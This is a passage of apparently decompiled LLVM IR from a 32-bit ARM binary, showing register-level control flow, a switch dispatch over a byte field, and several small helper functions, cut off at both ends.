  %stack_var_-2320.6 = phi i32 [ %stack_var_-2320.8.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a6cc ], [ %stack_var_-2320.8.ph, %dec_label_pc_a850 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a65c ], [ %stack_var_-2320.8.ph, %dec_label_pc_a684 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a784 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a708 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a5ec ], [ %stack_var_-2320.8.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2320.5, %dec_label_pc_a294 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a614 ]
  %stack_var_-2324.6 = phi i32 [ %stack_var_-2324.8.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a6cc ], [ %stack_var_-2324.8.ph, %dec_label_pc_a850 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a65c ], [ %stack_var_-2324.8.ph, %dec_label_pc_a684 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a784 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a708 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a5ec ], [ %stack_var_-2324.8.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2324.5, %dec_label_pc_a294 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a614 ]
  %stack_var_-2340.5 = phi i32 [ %stack_var_-2340.7.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a6cc ], [ %stack_var_-2340.7.ph, %dec_label_pc_a850 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a65c ], [ %stack_var_-2340.7.ph, %dec_label_pc_a684 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a784 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a708 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a5ec ], [ %stack_var_-2340.7.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2340.4, %dec_label_pc_a294 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a614 ]
  %stack_var_-2332.5 = phi i32 [ %stack_var_-2332.7.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a6cc ], [ %stack_var_-2332.7.ph, %dec_label_pc_a850 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a65c ], [ %stack_var_-2332.7.ph, %dec_label_pc_a684 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a784 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a708 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a5ec ], [ %stack_var_-2332.7.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2332.4, %dec_label_pc_a294 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a614 ]
  %v0_a878 = load i32, i32* @r5, align 4
  store i32 %v0_a878, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a1c4

dec_label_pc_a884:                                ; preds = %dec_label_pc_a850.dec_label_pc_a884_crit_edge, %dec_label_pc_a564
  %v0_a884 = phi i32 [ %v0_a884.pre, %dec_label_pc_a850.dec_label_pc_a884_crit_edge ], [ %v0_a568, %dec_label_pc_a564 ]
  store i32 %v0_a884, i32* @r0, align 4
  store i32 15, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a890:                                ; preds = %dec_label_pc_a8c0
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 15, i32* @r1, align 4
  br label %dec_label_pc_a898

dec_label_pc_a898:                                ; preds = %dec_label_pc_a1fc, %dec_label_pc_a650, %dec_label_pc_a890
  %v0_a898 = call i32 @function_9af8()
  store i32 %v0_a898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a89c

dec_label_pc_a89c:                                ; preds = %dec_label_pc_a580, %dec_label_pc_a8c0, %dec_label_pc_a074, %bb183, %dec_label_pc_a1c4, %dec_label_pc_a1f4, %dec_label_pc_a898
  %stack_var_-2336.5 = phi i32 [ %stack_var_-2336.1, %dec_label_pc_a1f4 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a898 ], [ %stack_var_-2336.0, %dec_label_pc_a1c4 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a580 ], [ %v0_a4e0, %bb183 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a074 ]
  %stack_var_-2316.5 = phi i16* [ %stack_var_-2316.1, %dec_label_pc_a1f4 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a8c0 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a898 ], [ %stack_var_-2316.0, %dec_label_pc_a1c4 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a580 ], [ %stack_var_-2316.6.lcssa, %bb183 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a074 ]
  %stack_var_-2328.8 = phi i16 [ %stack_var_-2328.4, %dec_label_pc_a1f4 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a898 ], [ %stack_var_-2328.3, %dec_label_pc_a1c4 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a580 ], [ %stack_var_-2328.9.ph, %bb183 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a074 ]
  %stack_var_-2320.7 = phi i32 [ %stack_var_-2320.3, %dec_label_pc_a1f4 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a898 ], [ %stack_var_-2320.2, %dec_label_pc_a1c4 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a580 ], [ %stack_var_-2320.8.ph, %bb183 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a074 ]
  %stack_var_-2324.7 = phi i32 [ %stack_var_-2324.3, %dec_label_pc_a1f4 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a898 ], [ %stack_var_-2324.2, %dec_label_pc_a1c4 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a580 ], [ %stack_var_-2324.8.ph, %bb183 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a074 ]
  %stack_var_-2340.6 = phi i32 [ %stack_var_-2340.2, %dec_label_pc_a1f4 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a898 ], [ %stack_var_-2340.1, %dec_label_pc_a1c4 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a580 ], [ %stack_var_-2340.7.ph, %bb183 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a074 ]
  %stack_var_-2332.6 = phi i32 [ %stack_var_-2332.2, %dec_label_pc_a1f4 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a8c0 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a898 ], [ %stack_var_-2332.1, %dec_label_pc_a1c4 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a580 ], [ %stack_var_-2332.7.ph, %bb183 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a074 ]
  %v4_a89c = ptrtoint i16* %stack_var_-2316.5 to i32
  %v1_a8a0 = add i32 %v4_a89c, 1
  store i32 %v1_a8a0, i32* %r1.global-to-local, align 4
  %v5_a8a4 = inttoptr i32 %v1_a8a0 to i16*
  br label %dec_label_pc_a8a8.preheader

dec_label_pc_a8a8.preheader:                      ; preds = %dec_label_pc_a89c, %dec_label_pc_9eb4
  %stack_var_-2336.6.ph = phi i32 [ %tmp123, %dec_label_pc_9eb4 ], [ %stack_var_-2336.5, %dec_label_pc_a89c ]
  %stack_var_-2316.6.ph = phi i16* [ null, %dec_label_pc_9eb4 ], [ %v5_a8a4, %dec_label_pc_a89c ]
  %stack_var_-2328.9.ph = phi i16 [ %stack_var_-2328.2, %dec_label_pc_9eb4 ], [ %stack_var_-2328.8, %dec_label_pc_a89c ]
  %stack_var_-2320.8.ph = phi i32 [ %stack_var_-2320.1, %dec_label_pc_9eb4 ], [ %stack_var_-2320.7, %dec_label_pc_a89c ]
  %stack_var_-2324.8.ph = phi i32 [ %stack_var_-2324.1, %dec_label_pc_9eb4 ], [ %stack_var_-2324.7, %dec_label_pc_a89c ]
  %stack_var_-2340.7.ph = phi i32 [ %v2_9bd4, %dec_label_pc_9eb4 ], [ %stack_var_-2340.6, %dec_label_pc_a89c ]
  %stack_var_-2332.7.ph = phi i32 [ %v0_9bcc, %dec_label_pc_9eb4 ], [ %stack_var_-2332.6, %dec_label_pc_a89c ]
  %v4_a8a8210 = ptrtoint i16* %stack_var_-2316.6.ph to i32
  %v2_a8b0211 = sub i32 %v4_a8a8210, %stack_var_-2332.7.ph
  %v4_a8b0212 = xor i32 %v4_a8a8210, %stack_var_-2332.7.ph
  %v5_a8b0213 = xor i32 %v2_a8b0211, %v4_a8a8210
  %v6_a8b0214 = and i32 %v5_a8b0213, %v4_a8b0212
  %v7_a8b0215 = icmp slt i32 %v6_a8b0214, 0
  %v8_a8b0216 = icmp slt i32 %v2_a8b0211, 0
  %v2_a8b4217 = xor i1 %v8_a8b0216, %v7_a8b0215
  br i1 %v2_a8b4217, label %dec_label_pc_a8c0, label %.thread117.lr.ph

.thread117.lr.ph:                                 ; preds = %dec_label_pc_a8a8.preheader
  %v2_a8b0 = sub i32 0, %stack_var_-2332.7.ph
  %v6_a8b0 = and i32 %stack_var_-2332.7.ph, %v2_a8b0
  %v7_a8b0 = icmp slt i32 %v6_a8b0, 0
  %v8_a8b0 = icmp slt i32 %v2_a8b0, 0
  %v2_a8b4 = xor i1 %v8_a8b0, %v7_a8b0
  br label %.thread117

.thread117:                                       ; preds = %.thread117.lr.ph, %.thread117
  br i1 %v2_a8b4, label %dec_label_pc_a8a8.dec_label_pc_a8c0_crit_edge, label %.thread117

dec_label_pc_a8a8.dec_label_pc_a8c0_crit_edge:    ; preds = %.thread117
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a8c0

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a8a8.dec_label_pc_a8c0_crit_edge, %dec_label_pc_a8a8.preheader
  %stack_var_-2316.6.lcssa = phi i16* [ null, %dec_label_pc_a8a8.dec_label_pc_a8c0_crit_edge ], [ %stack_var_-2316.6.ph, %dec_label_pc_a8a8.preheader ]
  %v4_a8a8.lcssa = phi i32 [ 0, %dec_label_pc_a8a8.dec_label_pc_a8c0_crit_edge ], [ %v4_a8a8210, %dec_label_pc_a8a8.preheader ]
  store i32 %v4_a8a8.lcssa, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-2340.7.ph, i32* %ip.global-to-local, align 4
  %v3_9ed4 = mul i32 %v4_a8a8.lcssa, 1048
  %v4_9ed4 = add i32 %v3_9ed4, %stack_var_-2340.7.ph
  store i32 %v4_9ed4, i32* @r5, align 4
  %v1_9ed8 = add i32 %v4_9ed4, 16
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = sext i8 %v3_9ed8 to i32
  %v5_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v5_9ed8, i32* %r3.global-to-local, align 4
  switch i32 %v4_9ed8, label %dec_label_pc_a89c [
    i32 0, label %dec_label_pc_9f28
    i32 1, label %dec_label_pc_a104
    i32 2, label %dec_label_pc_a218
    i32 3, label %dec_label_pc_a590
    i32 4, label %dec_label_pc_a5c8
    i32 5, label %dec_label_pc_a270
    i32 6, label %dec_label_pc_a6e4
    i32 7, label %dec_label_pc_a784
    i32 8, label %dec_label_pc_a63c
    i32 9, label %dec_label_pc_a2bc
    i32 10, label %dec_label_pc_a65c
    i32 11, label %dec_label_pc_a808
    i32 12, label %dec_label_pc_a3ec
    i32 13, label %dec_label_pc_a6a4
    i32 14, label %dec_label_pc_a4e8
    i32 15, label %dec_label_pc_a890
  ]

dec_label_pc_a8c4:                                ; preds = %dec_label_pc_9b40
  store i32 %v3_9b40, i32* @r4, align 4
  store i32 %v6_9b40, i32* @r5, align 4
  store i32 %v9_9b40, i32* @r6, align 4
  store i32 %v12_9b40, i32* @r7, align 4
  store i32 %v15_9b40, i32* @r8, align 4
  store i32 %v18_9b40, i32* @sb, align 4
  store i32 %v21_9b40, i32* @sl, align 4
  store i32 %v24_9b40, i32* @fp, align 4
  store i32 %v27_9b40, i32* @lr, align 4
  ret i32 %v0_9b50

; uselistorder directives
  uselistorder i8 %v3_9ed8, { 1, 0 }
  uselistorder i32 %v4_9ed4, { 23, 24, 3, 1, 2, 0, 7, 6, 5, 4, 22, 17, 18, 11, 10, 9, 8, 15, 16, 19, 20, 14, 13, 12, 21 }
  uselistorder i16* %stack_var_-2316.6.lcssa, { 19, 1, 16, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 20, 2, 3, 4, 5, 6, 7, 8, 14, 9, 15, 10, 33, 34, 11, 0, 12, 13, 18 }
  uselistorder i32 %v2_a8b0, { 1, 0 }
  uselistorder i32 %stack_var_-2332.7.ph, { 0, 18, 1, 2, 22, 30, 36, 37, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 17, 34, 21, 24, 25, 27, 28, 29, 31, 32, 33, 35, 4, 3, 19, 20, 23, 26, 38 }
  uselistorder i32 %stack_var_-2340.7.ph, { 0, 16, 20, 28, 34, 35, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 32, 19, 22, 23, 25, 26, 27, 29, 30, 31, 33, 2, 1, 17, 18, 21, 24, 36 }
  uselistorder i32 %stack_var_-2324.8.ph, { 18, 26, 35, 36, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 30, 31, 33, 32, 17, 20, 21, 23, 24, 25, 27, 28, 29, 34, 1, 0, 15, 16, 19, 22, 37 }
  uselistorder i32 %stack_var_-2320.8.ph, { 18, 29, 35, 36, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 33, 20, 22, 21, 17, 23, 24, 26, 27, 28, 30, 31, 32, 34, 1, 0, 15, 16, 19, 25, 37 }
  uselistorder i16 %stack_var_-2328.9.ph, { 35, 34, 18, 26, 32, 33, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 30, 17, 20, 21, 23, 24, 25, 27, 28, 29, 31, 1, 0, 15, 16, 19, 22, 36 }
  uselistorder i32 %stack_var_-2336.6.ph, { 19, 27, 33, 34, 14, 13, 12, 11, 10, 8, 7, 6, 5, 4, 3, 2, 15, 31, 23, 9, 18, 21, 22, 24, 25, 26, 28, 29, 30, 32, 1, 0, 16, 17, 20, 35 }
  uselistorder i32 %v0_a878, { 1, 0 }
  uselistorder i32 %v1_a850.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v1_a810, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_a7fc, { 1, 0 }
  uselistorder i32 %v1_a78c, { 1, 0, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_a778, { 1, 0 }
  uselistorder i32 %v1_a710, { 1, 0, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_a65c, { 1, 0, 2 }
  uselistorder i32 %v1_a590, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_a4f0, { 1, 0, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i32 %v5_a4c8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a474, { 1, 2, 0 }
  uselistorder i32 %v1_a45c, { 1, 0 }
  uselistorder i32 %v1_a3f4, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12 }
  uselistorder i32 %v0_a3a8, { 1, 0 }
  uselistorder i32 %v4_a388, { 1, 0, 2 }
  uselistorder i32 %v1_a358, { 1, 2, 0 }
  uselistorder i32 %v0_a34c, { 1, 2, 0 }
  uselistorder i32 %v1_a344, { 2, 1, 0 }
  uselistorder i1 %v9_a330, { 1, 0 }
  uselistorder i32 %v1_a33c208, { 1, 0 }
  uselistorder i32 %v0_a300, { 2, 1, 0 }
  uselistorder i32 %v0_a2fc, { 1, 0 }
  uselistorder i32 %stack_var_-2332.4, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-2340.4, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-2324.5, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-2320.5, { 0, 3, 2, 1 }
  uselistorder i16 %stack_var_-2328.6, { 0, 3, 2, 1 }
  uselistorder i16* %stack_var_-2316.3, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-2336.3, { 0, 3, 2, 1 }
  uselistorder i32 %v1_a200, { 1, 0 }
  uselistorder i32 %v0_a1cc, { 2, 0, 1 }
  uselistorder i32 %v1_a180, { 1, 0, 2 }
  uselistorder i32 %v5_a170, { 0, 4, 3, 2, 1, 5, 6, 7 }
  uselistorder i32 %v0_a15c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_a12c, { 1, 0 }
  uselistorder i32 %v3_a124, { 1, 0, 2 }
  uselistorder i32 %v3_a09c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v5_a06c, { 1, 0 }
  uselistorder i32 %v0_9ffc, { 2, 4, 0, 1, 3 }
  uselistorder i32 %v0_9fd0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_9fb8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_9f88, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v1_9ea4, { 1, 0 }
  uselistorder i32 %v0_9e88, { 1, 0 }
  uselistorder i32 %v2_9d4c, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_9d24, { 1, 0, 3, 2, 4, 6, 5, 7 }
  uselistorder i32 %v2_9cbc, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17 }
  uselistorder i32 %v2_9c20, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9bd4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9bcc, { 5, 0, 3, 4, 7, 6, 2, 1 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_9b50, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-1284, { 3, 4, 5, 6, 7, 1, 8, 0, 9, 10, 2, 11 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 0, 1, 3, 2 }
  uselistorder i32 %tmp130, { 0, 1, 3, 4, 2 }
  uselistorder i32 %tmp129, { 0, 1, 3, 4, 2 }
  uselistorder i32 %tmp123, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 38, 39, 13, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 40, 41, 30, 31, 32, 33, 35, 34, 2, 36, 37, 42, 1, 43, 44, 45, 46, 47, 48, 0, 49 }
  uselistorder i32* %r1.global-to-local, { 57, 58, 18, 2, 3, 12, 4, 5, 6, 30, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 31, 33, 34, 35, 36, 59, 37, 38, 39, 40, 41, 42, 43, 1, 44, 45, 46, 47, 48, 49, 50, 78, 51, 52, 53, 55, 54, 56, 61, 60, 77, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 0 }
  uselistorder i32* %r0.global-to-local, { 107, 108, 39, 38, 2, 3, 4, 5, 6, 7, 27, 9, 8, 10, 11, 12, 14, 13, 67, 16, 15, 17, 18, 19, 20, 22, 21, 24, 23, 26, 25, 29, 28, 31, 30, 33, 32, 35, 34, 37, 36, 40, 41, 43, 42, 44, 45, 47, 46, 48, 49, 50, 54, 51, 52, 53, 56, 55, 57, 58, 59, 61, 60, 63, 62, 64, 65, 66, 68, 73, 70, 69, 72, 71, 74, 75, 76, 105, 77, 110, 109, 111, 78, 158, 79, 80, 106, 81, 83, 82, 87, 84, 85, 86, 88, 90, 89, 92, 91, 94, 93, 95, 96, 97, 98, 99, 100, 101, 102, 104, 103, 113, 112, 1, 114, 115, 116, 117, 119, 118, 120, 122, 121, 123, 125, 124, 126, 128, 127, 129, 130, 132, 131, 133, 135, 134, 136, 138, 137, 159, 139, 140, 141, 142, 143, 144, 145, 147, 146, 148, 149, 151, 150, 152, 153, 155, 154, 156, 157, 0 }
  uselistorder i32* %ip.global-to-local, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @function_82c0, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), { 2, 3, 1, 4, 0, 5 }
  uselistorder i16* @global_var_1d4d1.136, { 1, 0 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_13f5c.179 to i32), { 1, 2, 0, 3 }
  uselistorder [2 x i8]* @global_var_13f3c.175, { 1, 0 }
  uselistorder i32 1044, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @function_9994, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c4d8, { 7, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8)* @function_9aa8, { 1, 2, 0 }
  uselistorder i8 3, { 1, 0, 4, 3, 2 }
  uselistorder i8 2, { 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_c288, { 1, 0 }
  uselistorder i32 2100, { 2, 0, 1 }
  uselistorder i32* @global_var_1d4d4.158, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_b3e8, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8, i32)* @function_ab54, { 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 7, 12, 13, 14, 15 }
  uselistorder i32 ()* @function_aab8, { 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 26, 24, 25, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_9430, { 1, 0 }
  uselistorder i32 (i32)* @function_83b4, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 29, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @function_81d0, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1048, { 3, 2, 6, 0, 1, 5, 4, 7 }
  uselistorder i32* @global_var_1d4cc.131, { 0, 2, 1 }
  uselistorder i32 %arg1, { 7, 6, 9, 8, 10, 12, 11, 1, 3, 2, 0, 5, 4, 13 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_a89c, { 1, 6, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_a898, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a878, { 9, 3, 4, 12, 5, 6, 7, 0, 8, 10, 11, 1, 2 }
  uselistorder label %dec_label_pc_a850, { 1, 0 }
  uselistorder label %dec_label_pc_a7fc, { 1, 0 }
  uselistorder label %dec_label_pc_a778, { 3, 2, 0, 1 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %dec_label_pc_a484, { 1, 0 }
  uselistorder label %dec_label_pc_a458, { 1, 0 }
  uselistorder label %dec_label_pc_a3a8, { 1, 0 }
  uselistorder label %dec_label_pc_a358, { 1, 0 }
  uselistorder label %.thread40, { 1, 0 }
  uselistorder label %dec_label_pc_a26c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a1f4, { 12, 11, 10, 0, 9, 8, 1, 3, 2, 7, 6, 5, 4, 14, 13 }
  uselistorder label %dec_label_pc_a1c4, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_a10c.dec_label_pc_a10c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_a074, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 7, 2, 4, 1, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_9fdc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_9f4c, { 5, 6, 3, 7, 8, 0, 9, 2, 10, 1, 11, 12, 4, 13 }
  uselistorder label %dec_label_pc_9e88, { 1, 0 }
  uselistorder label %dec_label_pc_9e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e60, { 1, 0 }
  uselistorder label %dec_label_pc_9d98, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
}

define i32 @function_a8d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_a8d8:
  %v0_a8d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_a8d8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_a8d8
  %v2_a900 = mul i32 %arg2, ptrtoint (i32* @global_var_a908.159 to i32)
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_a8d8, %bb
  %v3_a900 = phi i32 [ %arg1, %dec_label_pc_a8d8 ], [ %v2_a900, %bb ]
  ret i32 %v3_a900

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_a960(i32 %arg1) local_unnamed_addr {
dec_label_pc_a960:
  %v2_a96c = load i32, i32* @global_var_1d4dc.202, align 4
  %v2_a974 = call i32 @function_b950(i32 %v2_a96c, i32 9)
  ret i32 %v2_a974
}

define i32 @function_a988(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_a988:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a988 = load i32, i32* @r4, align 4
  %v6_a988 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @sl, align 4
  %v0_a998 = call i32 @function_e030()
  %v7_a99c = icmp eq i32 %v0_a998, -1
  %. = zext i1 %v7_a99c to i32
  %tmp24 = icmp slt i32 %v0_a998, 1
  br i1 %tmp24, label %thread-pre-split, label %bb25

bb25:                                             ; preds = %dec_label_pc_a988
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_a988, %bb25
  %v0_a9b0 = phi i32 [ 1, %bb25 ], [ %., %dec_label_pc_a988 ]
  %v2_a9b0 = icmp eq i32 %v0_a9b0, 0
  store i32 ptrtoint (i32* @global_var_1d4dc.202 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_a998, i32* @global_var_1d4dc.202, align 4
  br i1 %v2_a9b0, label %dec_label_pc_a9c0, label %dec_label_pc_aaa8

dec_label_pc_a9c0:                                ; preds = %thread-pre-split
  %v0_a9c0 = call i32 @function_93c8()
  %v0_a9c4 = load i32, i32* @r4, align 4
  %v1_a9c4 = urem i32 %v0_a9c4, 32
  store i32 %v1_a9c4, i32* @r6, align 4
  %v6_a9cc = shl i32 1, %v1_a9c4
  store i32 %v6_a9cc, i32* @r7, align 4
  %v2_a9d0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_a9d4 = udiv i32 %v0_a9c4, 32
  store i32 %v3_a9d4, i32* %r3.global-to-local, align 4
  %v4_a9d8 = mul nuw nsw i32 %v3_a9d4, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a9d0
  store i32 %v5_a9d8, i32* @r5, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v2_a9e0 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_a9e0, i32* @r8, align 4
  %v2_a9e4 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_a9e8

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_a9e8.backedge, %dec_label_pc_a9c0
  %v2_a9f426 = phi i32 [ %v2_a9f426.pre, %dec_label_pc_a9e8.backedge ], [ %v2_a9e0, %dec_label_pc_a9c0 ]
  %v0_a9ec = phi i32 [ %v0_a9ec.pre, %dec_label_pc_a9e8.backedge ], [ 16, %dec_label_pc_a9c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_a9ec, i32* %stack_var_-44, align 4
  store i32 0, i32* @lr, align 4
  %v4_a9f428 = inttoptr i32 %v2_a9f426 to i32*
  store i32 0, i32* %v4_a9f428, align 4
  %v0_a9f829 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f830 = add i32 %v0_a9f829, 4
  store i32 %v1_a9f830, i32* %r3.global-to-local, align 4
